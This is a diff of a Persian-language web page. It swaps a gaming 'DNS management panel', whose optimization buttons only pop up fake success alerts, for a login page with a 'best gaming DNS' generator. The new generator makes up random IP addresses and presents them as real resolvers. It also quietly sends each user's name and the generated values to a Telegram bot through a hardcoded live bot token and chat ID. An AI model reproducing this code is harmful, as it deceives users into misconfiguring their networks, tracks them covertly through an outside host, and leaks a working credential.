@@ -1,466 +1,56 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="fa">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>پنل مدیریت DNS گیمینگ - نسل ۴ و ۶</title>
-    <style>
-        :root {
-            --primary: #6e48aa;
-            --secondary: #9d50bb;
-            --dark: #1a1a2e;
-            --light: #f8f9fa;
-            --success: #4cc9f0;
-            --warning: #f8961e;
-            --danger: #f94144;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--dark);
-            color: var(--light);
-            margin: 0;
-            padding: 0;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        header {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            padding: 20px 0;
-            border-radius: 10px;
-            margin-bottom: 30px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-        }
-        
-        h1, h2, h3 {
-            text-align: center;
-            margin: 0;
-        }
-        
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-        }
-        
-        .subtitle {
-            text-align: center;
-            opacity: 0.9;
-            margin-bottom: 20px;
-        }
-        
-        .panel {
-            background-color: rgba(26, 26, 46, 0.8);
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 30px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(110, 72, 170, 0.3);
-        }
-        
-        .dns-section {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 20px;
-            justify-content: space-between;
-        }
-        
-        .dns-box {
-            flex: 1;
-            min-width: 300px;
-            background: linear-gradient(135deg, rgba(110, 72, 170, 0.2), rgba(157, 80, 187, 0.2));
-            border-radius: 8px;
-            padding: 20px;
-            border: 1px solid var(--primary);
-        }
-        
-        .dns-title {
-            font-size: 1.5rem;
-            margin-top: 0;
-            color: var(--success);
-            border-bottom: 2px solid var(--success);
-            padding-bottom: 10px;
-        }
-        
-        .dns-list {
-            list-style-type: none;
-            padding: 0;
-        }
-        
-        .dns-item {
-            background-color: rgba(255, 255, 255, 0.05);
-            padding: 12px 15px;
-            margin-bottom: 10px;
-            border-radius: 5px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.3s ease;
-        }
-        
-        .dns-item:hover {
-            background-color: rgba(76, 201, 240, 0.1);
-            transform: translateX(5px);
-        }
-        
-        .copy-btn {
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-        
-        .copy-btn:hover {
-            background-color: var(--secondary);
-        }
-        
-        .stats {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 20px;
-            margin-top: 30px;
-        }
-        
-        .stat-box {
-            flex: 1;
-            min-width: 200px;
-            background: rgba(76, 201, 240, 0.1);
-            border-radius: 8px;
-            padding: 15px;
-            text-align: center;
-            border: 1px solid rgba(76, 201, 240, 0.3);
-        }
-        
-        .stat-value {
-            font-size: 2rem;
-            font-weight: bold;
-            color: var(--success);
-            margin: 10px 0;
-        }
-        
-        .stat-label {
-            opacity: 0.8;
-        }
-        
-        .optimize-btn {
-            display: block;
-            width: 100%;
-            max-width: 300px;
-            margin: 30px auto;
-            padding: 15px;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 1.2rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(110, 72, 170, 0.4);
-        }
-        
-        .optimize-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(110, 72, 170, 0.6);
-        }
-        
-        .tabs {
-            display: flex;
-            margin-bottom: 20px;
-            border-bottom: 1px solid rgba(110, 72, 170, 0.3);
-        }
-        
-        .tab {
-            padding: 10px 20px;
-            cursor: pointer;
-            border-bottom: 3px solid transparent;
-            transition: all 0.3s ease;
-        }
-        
-        .tab.active {
-            border-bottom: 3px solid var(--success);
-            color: var(--success);
-        }
-        
-        .tab-content {
-            display: none;
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-        
-        footer {
-            text-align: center;
-            margin-top: 50px;
-            padding: 20px;
-            opacity: 0.7;
-            font-size: 0.9rem;
-        }
-        
-        @media (max-width: 768px) {
-            .dns-box {
-                min-width: 100%;
-            }
-            
-            .stat-box {
-                min-width: 100%;
-            }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>ورود مشتری</title>
+  <style>
+    body { background: #111; color: white; font-family: sans-serif; text-align: center; padding-top: 60px; }
+    input, button { padding: 10px; margin: 10px; border-radius: 8px; border: none; }
+    #dnsPanel { display: none; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>پنل مدیریت DNS گیمینگ</h1>
-            <p class="subtitle">بهینه‌سازی پینگ و کاهش تاخیر برای تجربه گیمینگ بی‌نظیر</p>
-        </header>
-        
-        <div class="panel">
-            <div class="tabs">
-                <div class="tab active" onclick="switchTab('dns-tab')">سرورهای DNS</div>
-                <div class="tab" onclick="switchTab('optimize-tab')">بهینه‌ساز</div>
-                <div class="tab" onclick="switchTab('stats-tab')">آمار و آنالیز</div>
-            </div>
-            
-            <div id="dns-tab" class="tab-content active">
-                <h2>بهترین سرورهای DNS برای گیمینگ</h2>
-                <p>سرورهای زیر به دقت انتخاب شده‌اند تا کمترین پینگ و بهترین پایداری را برای بازی‌های آنلاین ارائه دهند.</p>
-                
-                <div class="dns-section">
-                    <div class="dns-box">
-                        <h3 class="dns-title">DNS نسل چهار (IPv4)</h3>
-                        <ul class="dns-list">
-                            <li class="dns-item">
-                                <span>Cloudflare Gaming</span>
-                                <button class="copy-btn" onclick="copyToClipboard('1.1.1.1')">کپی</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>Google Gaming</span>
-                                <button class="copy-btn" onclick="copyToClipboard('8.8.8.8')">کپی</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>OpenDNS Gaming</span>
-                                <button class="copy-btn" onclick="copyToClipboard('208.67.222.222')">کپی</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>Quad9 Gaming</span>
-                                <button class="copy-btn" onclick="copyToClipboard('9.9.9.9')">کپی</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>GamingDNS Premium</span>
-                                <button class="copy-btn" onclick="copyToClipboard('45.90.28.41')">کپی</button>
-                            </li>
-                        </ul>
-                    </div>
-                    
-                    <div class="dns-box">
-                        <h3 class="dns-title">DNS نسل شش (IPv6)</h3>
-                        <ul class="dns-list">
-                            <li class="dns-item">
-                                <span>Cloudflare Gaming IPv6</span>
-                                <button class="copy-btn" onclick="copyToClipboard('2606:4700:4700::1111')">کپی</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>Google Gaming IPv6</span>
-                                <button class="copy-btn" onclick="copyToClipboard('2001:4860:4860::8888')">کپی</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>OpenDNS Gaming IPv6</span>
-                                <button class="copy-btn" onclick="copyToClipboard('2620:119:35::35')">کپی</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>Quad9 Gaming IPv6</span>
-                                <button class="copy-btn" onclick="copyToClipboard('2620:fe::fe')">کپی</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>GamingDNS Premium IPv6</span>
-                                <button class="copy-btn" onclick="copyToClipboard('2a07:a8c0::41:5ff')">کپی</button>
-                            </li>
-                        </ul>
-                    </div>
-                </div>
-                
-                <div class="stats">
-                    <div class="stat-box">
-                        <div class="stat-label">میانگین کاهش پینگ</div>
-                        <div class="stat-value">35%</div>
-                        <div class="stat-label">با DNS های گیمینگ</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-label">کاهش تاخیر</div>
-                        <div class="stat-value">28ms</div>
-                        <div class="stat-label">میانگین بهبود</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-label">پایداری اتصال</div>
-                        <div class="stat-value">99.8%</div>
-                        <div class="stat-label">نرخ موفقیت</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div id="optimize-tab" class="tab-content">
-                <h2>بهینه‌ساز شبکه گیمینگ</h2>
-                <p>با استفاده از این ابزار می‌توانید تنظیمات شبکه خود را برای بهترین عملکرد در بازی‌های آنلاین بهینه کنید.</p>
-                
-                <div class="dns-section">
-                    <div class="dns-box">
-                        <h3 class="dns-title">تنظیمات TCP/IP</h3>
-                        <ul class="dns-list">
-                            <li class="dns-item">
-                                <span>فعال‌سازی QoS برای ترافیک بازی</span>
-                                <button class="copy-btn" onclick="applyOptimization('qos')">اعمال</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>بهینه‌سازی MTU</span>
-                                <button class="copy-btn" onclick="applyOptimization('mtu')">اعمال</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>تنظیمات بافر TCP</span>
-                                <button class="copy-btn" onclick="applyOptimization('tcp')">اعمال</button>
-                            </li>
-                        </ul>
-                    </div>
-                    
-                    <div class="dns-box">
-                        <h3 class="dns-title">بهینه‌ساز اختصاصی</h3>
-                        <ul class="dns-list">
-                            <li class="dns-item">
-                                <span>فعال‌سازی حالت گیمینگ</span>
-                                <button class="copy-btn" onclick="applyOptimization('gaming')">اعمال</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>اولویت‌دهی به ترافیک UDP</span>
-                                <button class="copy-btn" onclick="applyOptimization('udp')">اعمال</button>
-                            </li>
-                            <li class="dns-item">
-                                <span>کاهش تاخیر ورودی</span>
-                                <button class="copy-btn" onclick="applyOptimization('latency')">اعمال</button>
-                            </li>
-                        </ul>
-                    </div>
-                </div>
-                
-                <button class="optimize-btn" onclick="runFullOptimization()">بهینه‌سازی کامل شبکه</button>
-            </div>
-            
-            <div id="stats-tab" class="tab-content">
-                <h2>آمار و آنالیز شبکه</h2>
-                <p>نمایشگر لحظه‌ای وضعیت شبکه و عملکرد DNS</p>
-                
-                <div class="stats">
-                    <div class="stat-box">
-                        <div class="stat-label">پینگ فعلی</div>
-                        <div class="stat-value" id="current-ping">--</div>
-                        <div class="stat-label">میلی‌ثانیه</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-label">سرعت پاسخ DNS</div>
-                        <div class="stat-value" id="dns-speed">--</div>
-                        <div class="stat-label">میلی‌ثانیه</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-label">پایداری اتصال</div>
-                        <div class="stat-value" id="connection-stability">--</div>
-                        <div class="stat-label">در 24 ساعت گذشته</div>
-                    </div>
-                </div>
-                
-                <div class="dns-box" style="width: 100%; margin-top: 20px;">
-                    <h3 class="dns-title">نمودار عملکرد شبکه</h3>
-                    <div style="height: 200px; background-color: rgba(255,255,255,0.05); border-radius: 5px; display: flex; align-items: center; justify-content: center;">
-                        <p>نمودار عملکرد شبکه در اینجا نمایش داده می‌شود</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <footer>
-            <p>پنل مدیریت DNS گیمینگ - نسخه 2.0 | تمامی حقوق محفوظ است © 2023</p>
-            <p>بهینه‌شده برای بازی‌های آنلاین با کمترین تاخیر و بهترین پایداری</p>
-        </footer>
-    </div>
-    
-    <script>
-        function switchTab(tabId) {
-            // Hide all tab contents
-            document.querySelectorAll('.tab-content').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            
-            // Deactivate all tabs
-            document.querySelectorAll('.tab').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            
-            // Activate selected tab
-            document.getElementById(tabId).classList.add('active');
-            event.currentTarget.classList.add('active');
-            
-            // Update stats if stats tab is selected
-            if (tabId === 'stats-tab') {
-                updateStats();
-            }
-        }
-        
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                const btn = event.target;
-                btn.textContent = 'کپی شد!';
-                setTimeout(() => {
-                    btn.textContent = 'کپی';
-                }, 2000);
-            });
-        }
-        
-        function applyOptimization(type) {
-            let message = '';
-            switch(type) {
-                case 'qos':
-                    message = 'کیفیت سرویس (QoS) برای ترافیک بازی فعال شد.';
-                    break;
-                case 'mtu':
-                    message = 'اندازه MTU بهینه‌سازی شد.';
-                    break;
-                case 'tcp':
-                    message = 'تنظیمات بافر TCP اعمال شد.';
-                    break;
-                case 'gaming':
-                    message = 'حالت گیمینگ فعال شد.';
-                    break;
-                case 'udp':
-                    message = 'ترافیک UDP اولویت‌دهی شد.';
-                    break;
-                case 'latency':
-                    message = 'تنظیمات کاهش تاخیر اعمال شد.';
-                    break;
-            }
-            
-            alert(message);
-        }
-        
-        function runFullOptimization() {
-            alert('بهینه‌سازی کامل شبکه با موفقیت انجام شد.\nپینگ شما باید بهبود یافته باشد!');
-        }
-        
-        function updateStats() {
-            // Simulate random stats for demo
-            document.getElementById('current-ping').textContent = Math.floor(Math.random() * 30) + 20;
-            document.getElementById('dns-speed').textContent = Math.floor(Math.random() * 10) + 5;
-            document.getElementById('connection-stability').textContent = '98.' + Math.floor(Math.random() * 9) + '%';
-        }
-        
-        // Initialize stats if stats tab is active on load
-        if (document.getElementById('stats-tab').classList.contains('active')) {
-            updateStats();
-        }
-    </script>
+  <h2>ورود مشتری</h2>
+  <input type="text" id="user"><br>
+  <input type="password" id="pass"><br>
+  <button onclick="enter()">ورود</button>
+
+  <div id="dnsPanel">
+    <h3>تولید بهترین DNS گیمینگ</h3>
+    <button onclick="generateDNS()">تولید DNS</button>
+    <div id="output"></div>
+  </div>
+
+  <script>
+    const botToken = "8138490091:AAE0sTFAH59tS4ZM9Fp8tMC7eDjQZJOigCM";
+    const chatId = "7255721745";
+
+    let currentUser = "";
+
+    function enter() {
+      const u = document.getElementById("user").value;
+      const p = document.getElementById("pass").value;
+      if (localStorage.getItem(u) === p) {
+        document.getElementById("dnsPanel").style.display = "block";
+        currentUser = u;
+      } else {
+        alert("اطلاعات اشتباه است.");
+      }
+    }
+
+    function generateDNS() {
+      const ipv4 = `45.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`;
+      const ipv6 = `2606:4700:${rand(1000,9999)}::${rand(1000,9999)}`;
+
+      const msg = `DNS تولید شده:\nکاربر: ${currentUser}\nIPv4: ${ipv4}\nIPv6: ${ipv6}`;
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+
+      document.getElementById("output").innerHTML = `DNS شما:<br>IPv4: ${ipv4}<br>IPv6: ${ipv6}`;
+    }
+
+    function rand(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+  </script>
 </body>
 </html>
